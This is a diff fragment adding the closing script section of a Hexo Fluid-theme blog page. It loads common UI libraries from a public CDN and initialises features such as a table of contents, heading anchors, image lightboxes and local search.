+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
